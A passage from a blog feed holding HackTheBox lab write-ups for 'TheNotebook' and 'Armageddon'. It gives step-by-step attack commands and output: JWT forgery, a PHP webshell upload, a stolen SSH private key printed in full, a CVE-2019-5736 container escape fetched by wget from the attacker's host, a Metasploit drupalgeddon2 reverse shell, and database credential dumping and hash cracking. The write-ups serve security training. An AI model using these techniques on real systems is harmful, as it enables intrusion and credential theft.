&lt;code&gt;admin_cap&lt;/code&gt; parameter to &lt;code&gt;1&lt;/code&gt; and sign it using our private key.&lt;/p&gt;
&lt;p&gt;By replacing our token with the new one we can now access the &lt;a href="http://10.129.82.59/admin"&gt;admin panel&lt;/a&gt;
an view all the notes including the ones from the "admin" user saying that PHP
files are being executed.&lt;/p&gt;
&lt;p&gt;We use the admin panel to upload &lt;code&gt;simple-backdoor.php&lt;/code&gt; (located in
&lt;code&gt;/usr/share/webshells/php&lt;/code&gt; on Kali Linux).
We can now execute command on the system using our webshell.&lt;/p&gt;
&lt;p&gt;We found a "home.tar.gz" archive in the &lt;code&gt;/backups/&lt;/code&gt; folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls%20../../backups&lt;/span&gt;
&lt;span class="code-line"&gt;apt.extended_states.0&lt;/span&gt;
&lt;span class="code-line"&gt;apt.extended_states.1.gz&lt;/span&gt;
&lt;span class="code-line"&gt;apt.extended_states.2.gz&lt;/span&gt;
&lt;span class="code-line"&gt;home.tar.gz&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We copy the archive to our parent directory and extract it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cmd=cp%20../../backups/home.tar.gz%20../&lt;/span&gt;
&lt;span class="code-line"&gt;cmd=tar%20xvf%20../home.tar.gz%20-C%20../&lt;/span&gt;
&lt;span class="code-line"&gt;home/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.bash_logout&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.cache/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.cache/motd.legal-displayed&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.gnupg/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.gnupg/private-keys-v1.d/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.profile&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.ssh/authorized_keys&lt;/span&gt;
&lt;span class="code-line"&gt;home/noah/.ssh/id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can then get the "noah" user private SSH key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cmd=cat%20../home/noah/.ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;MIIEpQIBAAKCAQEAyqucvz6P/EEQbdf8cA44GkEjCc3QnAyssED3qq9Pz1LxEN04&lt;/span&gt;
&lt;span class="code-line"&gt;HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT&lt;/span&gt;
&lt;span class="code-line"&gt;rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b&lt;/span&gt;
&lt;span class="code-line"&gt;HVo4kvIHT0IXveAivxez3UpiulFkaQ4zk37rfHO3wuTWsyZ0vmL7gr3fQRBndrUD&lt;/span&gt;
&lt;span class="code-line"&gt;v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX&lt;/span&gt;
&lt;span class="code-line"&gt;rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH&lt;/span&gt;
&lt;span class="code-line"&gt;+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf&lt;/span&gt;
&lt;span class="code-line"&gt;Q9y29Nx7ce/JPGzAiKDGvH2JvaoF22qz9yQ5uOEzMMdpigS81snsV10gse1bQd4h&lt;/span&gt;
&lt;span class="code-line"&gt;CA4ehjzUultDO7RPlDtbZCNxrhwpmBMjCjQna0R2TqPjEs4b7DT1Grs9O7d7pyNM&lt;/span&gt;
&lt;span class="code-line"&gt;Um/rxjBx7AcbP+P7LBqLrnk7kCXeZXbi15Lc9uDUS2c3INeRPmbFl5d7OdlTbXce&lt;/span&gt;
&lt;span class="code-line"&gt;YwHVJckFXyeVP6Qziu3yA3p6d+fhFCzWU3uzUKBL0GeJSARxISsvVRzXlHRBGU9V&lt;/span&gt;
&lt;span class="code-line"&gt;AuyJ2O4JAoGBAO67RmkGsIAIww/DJ7fFRRK91dvQdeaFSmA7Xf5rhWFymZ/spj2/&lt;/span&gt;
&lt;span class="code-line"&gt;rWuuxIS2AXp6pmk36GEpUN1Ea+jvkw/NaMPfGpIl50dO60I0B4FtJbood2gApfG9&lt;/span&gt;
&lt;span class="code-line"&gt;0uPb7a+Yzbj10D3U6AnDi0tRtFwnnyfRevS+KEFVXHTLPTPGjRRQ41OdAoGBANlU&lt;/span&gt;
&lt;span class="code-line"&gt;kn7eFJ04BYmzcWbupXaped7QEfshGMu34/HWl0/ejKXgVkLsGgSB5v3aOlP6KqEE&lt;/span&gt;
&lt;span class="code-line"&gt;vk4wAFKj1i40pEAp0ZNawD5TsDSHoAsIxRnjRM+pZ2bjku0GNzCAU82/rJSnRA+X&lt;/span&gt;
&lt;span class="code-line"&gt;i7zrFYhfaKldu4fNYgHKgDBx8X/DeD0vLellpLx/AoGBANoh0CIi9J7oYqNCZEYs&lt;/span&gt;
&lt;span class="code-line"&gt;QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K&lt;/span&gt;
&lt;span class="code-line"&gt;VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ&lt;/span&gt;
&lt;span class="code-line"&gt;vglmvw2DW6l0EwX+A+ZuSmiZAoGAb2mgtDMrRDHc/Oul3gvHfV6CYIwwO5qK+Jyr&lt;/span&gt;
&lt;span class="code-line"&gt;2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ&lt;/span&gt;
&lt;span class="code-line"&gt;z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+&lt;/span&gt;
&lt;span class="code-line"&gt;8iCuZAcCgYEA1fhcJzNwEUb2EOV/AI23rYpViF6SiDTfJrtV6ZCLTuKKhdvuqkKr&lt;/span&gt;
&lt;span class="code-line"&gt;JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+&lt;/span&gt;
&lt;span class="code-line"&gt;Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use it to connect on the box as "noah" and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ ssh noah@10.129.82.59 -i id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;noah@thenotebook:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(noah) gid=1000(noah) groups=1000(noah)&lt;/span&gt;
&lt;span class="code-line"&gt;noah@thenotebook:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;4a22cbbbecb491a77b6659fdf00183ba&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;root&lt;/h1&gt;
&lt;h2 id="docker"&gt;Docker&lt;/h2&gt;
&lt;p&gt;We enumerate our permission on the box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;noah@thenotebook:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for noah on thenotebook:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User noah may run the following commands on thenotebook:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our user can execute command on the "webapp-dev01" docker machine. We can use
&lt;code&gt;sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash&lt;/code&gt; to get a bash shell
inside the docker.&lt;/p&gt;
&lt;p&gt;As docker is used we run the &lt;a href="https://github.com/stealthcopter/deepce"&gt;deepce&lt;/a&gt;
script on the host box. The script found that the docker version used it
vulnerable to a container escape exploit.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;noah@thenotebook:~$ sh deepce.sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                      ##         .&lt;/span&gt;
&lt;span class="code-line"&gt;                ## ## ##        ==&lt;/span&gt;
&lt;span class="code-line"&gt;            ## ## ## ##       ===&lt;/span&gt;
&lt;span class="code-line"&gt;        /&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;\___/ ===&lt;/span&gt;
&lt;span class="code-line"&gt;    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~&lt;/span&gt;
&lt;span class="code-line"&gt;        \______ X           __/&lt;/span&gt;
&lt;span class="code-line"&gt;          \    \         __/&lt;/span&gt;
&lt;span class="code-line"&gt;            \____\_______/&lt;/span&gt;
&lt;span class="code-line"&gt;          __&lt;/span&gt;
&lt;span class="code-line"&gt;    ____/ /__  ___  ____  ________&lt;/span&gt;
&lt;span class="code-line"&gt;    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE&lt;/span&gt;
&lt;span class="code-line"&gt;  / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE&lt;/span&gt;
&lt;span class="code-line"&gt;  \__,_/\___/\___/ .___/\___/\___/  ESCAPE&lt;/span&gt;
&lt;span class="code-line"&gt;                /_/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)&lt;/span&gt;
&lt;span class="code-line"&gt;by stealthcopter&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;==========================================( Colors )==========================================&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Exploit Test ............ Exploitable - Check this out&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Basic Test .............. Positive Result&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Another Test ............ Error running check&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Negative Test ........... No&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Multi line test ......... Yes&lt;/span&gt;
&lt;span class="code-line"&gt;Command output&lt;/span&gt;
&lt;span class="code-line"&gt;spanning multiple lines&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Tips will look like this and often contains links with additional info. You can usually&lt;/span&gt;
&lt;span class="code-line"&gt;ctrl+click links in modern terminal to open in a browser window&lt;/span&gt;
&lt;span class="code-line"&gt;See https://stealthcopter.github.io/deepce&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;===================================( Enumerating Platform )===================================&lt;/span&gt;
&lt;span class="code-line"&gt;grep: /proc/1/cgroup: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;grep: /proc/1/cgroup: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;grep: /proc/1/cgroup: No such file or directory&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Inside Container ........ No&lt;/span&gt;
&lt;span class="code-line"&gt;[+] User .................... noah&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Groups .................. noah&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Container tools ......... Yes&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/docker&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/lxc&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Docker Executable ....... /usr/bin/docker&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Docker version .......... 18.06.0-ce&lt;/span&gt;
&lt;span class="code-line"&gt;[+] User in Docker group .... No&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Docker Sock ............. Yes&lt;/span&gt;
&lt;span class="code-line"&gt;srw-rw---- 1 root docker 0 Mar  7 10:10 /var/run/docker.sock&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Sock is writable ........ No&lt;/span&gt;
&lt;span class="code-line"&gt;To see full info from the docker sock output run the following&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;curl -s --unix-socket /var/run/docker.sock http://localhost/info&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Docker Exploits ......... 18.06.0-ce&lt;/span&gt;
&lt;span class="code-line"&gt;[+] CVE–2019–13139 .......... deepce.sh: 139: printf: 0-ce: not completely converted&lt;/span&gt;
&lt;span class="code-line"&gt;Yes&lt;/span&gt;
&lt;span class="code-line"&gt;Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when&lt;/span&gt;
&lt;span class="code-line"&gt;parsing URLs&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] CVE–2019–5736 ........... deepce.sh: 139: printf: 0-ce: not completely converted&lt;/span&gt;
&lt;span class="code-line"&gt;Yes&lt;/span&gt;
&lt;span class="code-line"&gt;Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the&lt;/span&gt;
&lt;span class="code-line"&gt;runC binary&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;==================================( Enumerating Containers )==================================&lt;/span&gt;
&lt;span class="code-line"&gt;==============================================================================================&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A quick Google search return us a simple &lt;a href="https://github.com/Frichetten/CVE-2019-5736-PoC"&gt;CVE-2019-5736 PoC&lt;/a&gt;
written in Golang.&lt;/p&gt;
&lt;p&gt;We modify the &lt;code&gt;main.go&lt;/code&gt; file with the payload &lt;code&gt;var payload = "#!/bin/bash \n cat /root/root.txt &amp;gt; /tmp/shadow &amp;amp;&amp;amp; chmod 777 /tmp/shadow"&lt;/code&gt;
and compile it using &lt;code&gt;go build main.go&lt;/code&gt;. We then download it from the docker and
run it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;root@893ea5c84398:/opt/webapp# cd /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;root@893ea5c84398:/tmp# wget http://10.10.14.28:8000/main&lt;/span&gt;
&lt;span class="code-line"&gt;--2021-03-08 17:07:53--  http://10.10.14.28:8000/main&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;2021-03-08 17:07:53 (10.8 MB/s) - ‘main’ saved [2236814/2236814]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;root@893ea5c84398:/tmp# chmod +x main&lt;/span&gt;
&lt;span class="code-line"&gt;root@893ea5c84398:/tmp# ./main&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Overwritten /bin/sh successfully&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Found the PID: 103&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Successfully got the file handle&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Successfully got write handle &amp;amp;{0xc0004078c0}&lt;/span&gt;
&lt;span class="code-line"&gt;root@893ea5c84398:/tmp#&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On another terminal on the "thenotebook" host we run the following command (our exploit binary rewrite
&lt;code&gt;/bin/sh&lt;/code&gt; so we need to call that command) and get the private flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;No help topic for &amp;#39;/bin/sh&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;noah@thenotebook:~$ ls /tmp/&lt;/span&gt;
&lt;span class="code-line"&gt;home  shadow  systemd-private-0c3e87bdcb724a669778cfa72c5b4017-systemd-timesyncd.service-vsSHAh  tmux-1000  vmware-root_611-3980232955&lt;/span&gt;
&lt;span class="code-line"&gt;noah@thenotebook:~$ cat /tmp/shadow&lt;/span&gt;
&lt;span class="code-line"&gt;e16458a8ec21a020bb382e56d8f0ed42&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An interesting box as working with JWT token is more and more common. The docker
exploit is simple to use. A nice box overall.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="JWT"></category><category term="docker"></category><category term="CVE-2019-5736"></category><category term="CVE"></category></entry><entry><title>HTB: Armageddon</title><link href="https://maggick.fr/2021/07/htb-armageddon.html" rel="alternate"></link><published>2021-07-26T11:00:00+02:00</published><updated>2021-07-26T11:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-07-26:/2021/07/htb-armageddon.html</id><summary type="html">&lt;p&gt;&lt;img alt="armageddon Card" class="align-left" src="/media/2021.07/armageddon_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/323"&gt;Armageddon&lt;/a&gt; publish on
Mars 27, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;Bertolis&lt;/a&gt;.
This box is rated as an easy machine. It implies the drupalgeddon vulnerability
and some permissive &lt;code&gt;sudo&lt;/code&gt; permissions.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.07/armageddon_card.png" alt="armageddon Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/323"&gt;Armageddon&lt;/a&gt; publish on
Mars 27, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;Bertolis&lt;/a&gt;.
This box is rated as an easy machine. It implies the drupalgeddon vulnerability
and some permissive &lt;code&gt;sudo&lt;/code&gt; permissions.&lt;/p&gt;


&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sat May 15 04:16:52 2021 as: nmap -p- -oN nmap -sSV 10.129.48.89&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.48.89&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.015s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sat May 15 04:17:15 2021 -- 1 IP address (1 host up) scanned in 22.79 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The name and the blog on the port 80 directly made me think about drupalgeddon.
We fireup metasloit.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; use exploit/unix/webapp/drupal_drupalgeddon2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf6 exploit(unix/webapp/drupal_drupalgeddon2) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.17:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Executing automatic check (disable AutoCheck to override)&lt;/span&gt;
&lt;span class="code-line"&gt;[+] The target is vulnerable.&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Sending stage (39282 bytes) to 10.129.48.89&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Meterpreter session 3 opened (10.10.14.17:4444 -&amp;gt; 10.129.48.89:38608) at 2021-04-25 04:52:28 -0400&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="code-line"&gt;Process 2993 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Channel 0 created.&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="privilege-escalation"&gt;Privilege escalation&lt;/h1&gt;
&lt;p&gt;We start enumeration the box and gout the MySQL Database password in a
configuration file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat ./sites/default/settings.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$databases = array (&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;#39;default&amp;#39; =&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  array (&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;default&amp;#39; =&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    array (&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;database&amp;#39; =&amp;gt; &amp;#39;drupal&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;username&amp;#39; =&amp;gt; &amp;#39;drupaluser&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;password&amp;#39; =&amp;gt; &amp;#39;CQHEy@9M*m23gBVj&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;host&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;port&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;driver&amp;#39; =&amp;gt; &amp;#39;mysql&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;#39;prefix&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;    ),&lt;/span&gt;
&lt;span class="code-line"&gt;  ),&lt;/span&gt;
&lt;span class="code-line"&gt;);&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;mysldump&lt;/code&gt; to dump the database in a file. Inside the dump we found the
hashed password for the website users.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mysqldump -u drupaluser -p drupal &amp;gt; /tmp/dump&lt;/span&gt;
&lt;span class="code-line"&gt;Enter password: CQHEy@9M*m23gBVj&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;LOCK TABLES `users` WRITE;&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `users` DISABLE KEYS */;&lt;/span&gt;
&lt;span class="code-line"&gt;INSERT INTO `users` VALUES (0,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,NULL,0,0,0,0,NULL,&amp;#39;&amp;#39;,0,&amp;#39;&amp;#39;,NULL),(1,&amp;#39;brucetherealadmin&amp;#39;,&amp;#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&amp;#39;,&amp;#39;admin@armageddon.eu&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;filtered_html&amp;#39;,1606998756,1607077194,1607076276,1,&amp;#39;Europe/London&amp;#39;,&amp;#39;&amp;#39;,0,&amp;#39;admin@armageddon.eu&amp;#39;,&amp;#39;a:1:{s:7:\&amp;quot;overlay\&amp;quot;;i:1;}&amp;#39;),(3,&amp;#39;admin&amp;#39;,&amp;#39;$S$DM9qGcKQlMpP4V5r4Dv8XlqsecY6zJrBwRyrkkF5YUjUiJt46NQP&amp;#39;,&amp;#39;admin@armageddon.htb&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;&amp;#39;,&amp;#39;filtered_html&amp;#39;,1618820338,0,0,0,&amp;#39;Europe/London&amp;#39;,&amp;#39;&amp;#39;,0,&amp;#39;admin@armageddon.htb&amp;#39;,NULL);&lt;/span&gt;
&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `users` ENABLE KEYS */;&lt;/span&gt;
&lt;span class="code-line"&gt;UNLOCK TABLES;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We put them in a file and run &lt;code&gt;john&lt;/code&gt; on it. We found the password for the
&lt;code&gt;brucetherealadmin&lt;/code&gt; user. Which is also a system user (see &lt;code&gt;/etc/passwd&lt;/code&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ john hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])&lt;/span&gt;
&lt;span class="code-line"&gt;Cost 1 (iteration count) is 32768 for all loaded hashes&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 8 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;booboo           (brucetherealadmin)&lt;/span&gt;
